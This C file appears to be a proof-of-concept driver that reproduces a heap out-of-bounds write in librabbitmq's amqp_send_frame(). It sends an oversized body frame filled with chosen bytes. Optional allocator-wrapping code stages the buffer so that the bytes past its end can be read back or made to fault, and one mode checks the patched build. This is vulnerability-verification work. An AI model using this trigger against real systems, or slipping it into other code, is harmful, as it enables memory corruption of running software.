/*
 * rabbitmq-c CVE-2026-61547 / GHSA-hfjv-vcp3-39wh extracted driver.
 *
 * Calls the REAL public amqp_send_frame() API from the pinned upstream
 * librabbitmq sources. No library source is copied or patched here. The only
 * harness code is an optional allocator interposer used to place the real
 * outbound frame buffer in page-aligned memory so chosen bytes past its end
 * can be read back, or so the first past-end store meets a PROT_NONE page.
 * That changes where the bytes land, never the library code that writes them.
 */
#include <rabbitmq-c/amqp.h>
#include <rabbitmq-c/framing.h>

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <signal.h>
#include <sys/socket.h>

#ifdef ALLOC_INTERPOSER
#include <sys/mman.h>
#include <unistd.h>

/* The vulnerable build calls realloc(NULL, 65536) from amqp_tune_connection:
 * (amqp_connection.c:140) via amqp_new_connection:53. Interpose exactly that
 * allocation. Every other allocation goes to the real allocator. */
#define OUTBOUND_SIZE 65536
static void *staged;
static int guard_mode;

void *__real_realloc(void *, size_t);
void __real_free(void *);

void *__wrap_realloc(void *ptr, size_t size) {
  if (ptr == NULL && size == OUTBOUND_SIZE && staged == NULL) {
    size_t ps = (size_t)sysconf(_SC_PAGESIZE);
    size_t span = OUTBOUND_SIZE + 8 * 1024 * 1024;
    span = (span + ps - 1) & ~(ps - 1);
    void *p = mmap(NULL, span, PROT_READ | PROT_WRITE,
                   MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (p == MAP_FAILED) return NULL;
    if (guard_mode) {
      if (mprotect((char *)p + OUTBOUND_SIZE, span - OUTBOUND_SIZE,
                   PROT_NONE) != 0) {
        munmap(p, span);
        return NULL;
      }
    }
    staged = p;
    return p;
  }
  return __real_realloc(ptr, size);
}

void __wrap_free(void *ptr) {
  if (ptr == staged) return; /* mmap region, deliberately not unmapped */
  __real_free(ptr);
}
#endif

static void usage(void) {
  fprintf(stderr,
          "usage: driver MODE [LEN] [VALUE]\n"
          "  asan LEN VALUE     real library under ASan (overflow report)\n"
          "  plain LEN VALUE    real library, unsanitized (return code only)\n"
          "  readback LEN VALUE staged buffer, print chosen bytes past +65536\n"
          "  guard LEN VALUE    staged PROT_NONE guard, fault on first store\n"
          "  fixed LEN VALUE    patched library, expect BAD_AMQP_DATA\n");
  exit(2);
}

int main(int argc, char **argv) {
  if (argc < 2) usage();
  const char *mode = argv[1];
  size_t len = (size_t)(argc > 2 ? strtoul(argv[2], NULL, 10) : 200000);
  uint8_t value = (uint8_t)(argc > 3 ? strtoul(argv[3], NULL, 16) : 0x5a);

#ifdef ALLOC_INTERPOSER
  if (strcmp(mode, "guard") == 0) guard_mode = 1;
#endif

  amqp_connection_state_t conn = amqp_new_connection();
  if (conn == NULL) {
    fprintf(stderr, "amqp_new_connection failed\n");
    return 3;
  }
  /* Serialization happens before any send. Give the connection a local
   * AF_UNIX socketpair (no network, no broker) shut down for writing so the
   * post-copy send fails immediately instead of asserting on a NULL socket.
   * Rung-1/healthy controls then return normally after the library's copy. */
  signal(SIGPIPE, SIG_IGN);
  int sp[2];
  if (socketpair(AF_UNIX, SOCK_STREAM, 0, sp) == 0) {
    shutdown(sp[1], SHUT_WR);
    amqp_set_sockfd(conn, sp[1]);
  }

  /* The payload is the caller's chosen content and the length is the chosen
   * count. Both are exactly what the public API accepts from an application. */
  char *body = (char *)malloc(len);
  if (body == NULL) {
    fprintf(stderr, "malloc failed\n");
    amqp_destroy_connection(conn);
    return 3;
  }
  memset(body, value, len);

  amqp_frame_t frame;
  memset(&frame, 0, sizeof(frame));
  frame.frame_type = AMQP_FRAME_BODY;
  frame.channel = 1;
  frame.payload.body_fragment.bytes = body;
  frame.payload.body_fragment.len = len;

  int rc = amqp_send_frame(conn, &frame);
  printf("mode=%s len=%zu value=%02x rc=%d\n", mode, len, value, rc);

#ifdef ALLOC_INTERPOSER
  if (staged != NULL && strcmp(mode, "readback") == 0) {
    static const size_t offs[] = {65536, 65552, 65584, 65600, 65792,
                                  66048, 67584, 69632};
    for (size_t i = 0; i < sizeof(offs) / sizeof(offs[0]); i++) {
      printf("+%zu=%02x", offs[i], ((unsigned char *)staged)[offs[i]]);
    }
    printf("\n");
  }
#endif

  free(body);
  amqp_destroy_connection(conn);
  return 0;
}
